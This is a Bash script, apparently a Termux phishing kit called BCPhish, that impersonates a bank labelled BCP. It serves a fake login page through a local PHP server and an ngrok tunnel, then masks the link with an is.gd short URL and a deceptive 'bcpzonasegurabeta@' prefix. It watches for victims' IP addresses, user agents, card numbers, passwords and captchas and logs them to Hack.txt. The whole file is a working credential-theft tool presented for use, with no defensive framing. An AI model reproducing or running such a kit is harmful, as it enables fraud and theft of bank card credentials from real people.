#!/bin/bash
luck=~/BCPhish
luck2=~/BCPhish/website
#colors
R='\e[1;31m'
G='\e[1;32m'
Y='\e[1;33m'
B='\e[1;34m'
M='\e[1;35m'
C='\e[1;36m'
W='\e[1;37m'
P='\e[1;35m'
Green='\e[32m'
Gr='\e[5m\e[32m'
Gris='\e[90m'

r="\e[1;91m"
g="\e[1;92m"
y="\e[1;93m"
w="\e[1;39m"
c="\e[1;96m"
b="\e[1;94m"
o="\e[1;33m"

error() { echo -e "\\033[1;31m[\033[1;36mPROCESO INTERRUMPIDO POR EL USUARIO\033[1;31m]\\033[1;32m  $*"; exit 1 ; }
clear


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}
depen() {
printf "\e[1;92m"
command -v php > /dev/null 2>&1 || { echo -e >&2 "Requiero php. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v curl > /dev/null 2>&1 || { echo -e >&2 "Requiero curl. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v ngrok > /dev/null 2>&1 || { echo -e >&2 "Requiero ngrok. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo -e >&2 "Requiero openssh. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
command -v proot resolv-conf > /dev/null 2>&1 || { echo -e >&2 "Requiero proot. Por favor instalalo. Abortando... \e[0m"; sleep 2; exit 1; }
}


Ngrok(){
echo -e "$G[+]$W Iniciando servidores..."
sleep 2
LPORT=$(shuf -i 1111-9999 -n 1)
echo -e "$G[+]$W Abriendo servidor php..."
cd $luck2 && php -S 127.0.0.1:$LPORT > /dev/null 2>&1 &
sleep 3
echo -e "$G[+]$W Abriendo servidor ssh..."
sleep 3
echo -e "$G[+]$W Abriendo servidor local.."
sleep 3
echo -e "$G[+]$W Abriendo servidor ngrok..."
sleep 3
termux-chroot ngrok http $LPORT > /dev/null 2>&1 &
sleep 10
link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep   -o 'https://[a-z0-9-]\{2,4\}\+.ngrok.io')
sleep 1
}
URL(){
echo -e "$G[+]$W Capturando las URLs..."
sleep 2
echo -e "$G[+]$W Envia a la victima --> http://localhost:$LPORT"
sleep 0.9
echo -e "$G[+]$W Envia a la victima --> $link"
sleep 0.9
text="bcpzonasegurabeta"
WORDS=$(echo -e "${text}" | tr ' ' ' - ')
SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
echo -e "${SHORT}" >> url.txt
PROTOCOL=$(cut -d "/" -f1 url.txt)
DOMAIN=$(cut -d "/" -f4 url.txt)
CUSTOM="${PROTOCOL}//${WORDS}@is.gd/${DOMAIN}"
rm url.txt
echo -e "$G[+]$W Envia a la victima --> ${CUSTOM}"
sleep 0.9
echo 
echo -e "$G[+]$W Interactuando con la victima..$W"
}
interaccion(){
while [ True ]; do
if [[ -e $luck2/ip.txt ]]; then
printf "$G[+]$W #######"
sleep 0.6
printf "##########"
sleep 0.5
printf "############\n"
sleep 1
sleep 2
echo -e "$G[+]$W"
echo -e "$G[+]$W La victima accedio al enlace :).."
sleep 4
echo -e "$G[+]$W"
ip=$(grep -a 'IP :' $luck2/ip.txt | cut -d " " -f3 | tr -d '\r')
sleep 2
echo -e "$G[+]$W IP =$Gren $ip"
sleep 1
NA=$(cat $luck2/ip.txt|grep User-Agent  | cut -d ":" -f2)
sleep 1
echo -e "$G[+]$W User Agent =$Gren $NA"
sleep 1
echo -e "$G[+]$W"
if [ ! -e $luck/Hack.txt ]; then
touch $luck/Hack.txt
fi
echo "[+] ########################################" >> Hack.txt
echo "[+] Fecha: $(date)" >> Hack.txt
echo "[+] Obtendo de BCP " >> Hack.txt
echo "[+] IP = $ip" >> Hack.txt
echo "[+] User Agent = $NA" >> Hack.txt
rm $luck2/ip.txt
fi
if [ -e $luck2/datos.txt ]; then
sleep 1
echo -e "$G[+]$W"
echo -e "$G[+]$W Clave que la victima coloco :)"
sleep 1
echo -e "$G[+]$W"
sleep 1
targe=$(cat $luck2/datos.txt|grep Targeta | cut -d ":" -f2)
clave=$(cat $luck2/datos.txt|grep Clave | cut -d ":" -f2)
captcha=$(cat $luck2/datos.txt|grep Captcha | cut -d ":" -f2)
sleep 2
echo -e "$G[+]$W Targeta =$Gren $targe"
echo -e "$G[+]$W Clave   =$Gren $clave"
echo -e "$G[+]$W Captcha =$Gren $captcha" 
echo "[+] Targeta = $targe" >> Hack.txt
echo "[+] Clave   = $clave" >> Hack.txt
echo "[+] Captcha = $captcha" >> Hack.txt
rm $luck2/datos.txt
sleep 1
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "#############"
sleep 1
echo -e "\n$G[+]$W Interactuando con la victima...$W"
echo -e "$G[+]$W"
fi
done
}
depen
Ngrok
URL
interaccion
stop
